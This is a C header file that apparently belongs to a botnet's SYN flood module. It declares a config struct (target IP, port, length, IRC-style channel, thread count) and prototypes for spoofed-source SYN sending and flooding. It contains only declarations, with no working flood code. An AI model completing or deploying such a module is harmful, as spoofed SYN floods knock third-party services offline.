#ifndef NO_SYN  
typedef struct SYNFLOOD {

    char ip[128];
    char port[128];
    char length[128];
    char chan[128];
    int threadnum;

} SYNFLOOD;

long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort,int Times);
long SynFlood(char *target, char *port, char *len);
#endif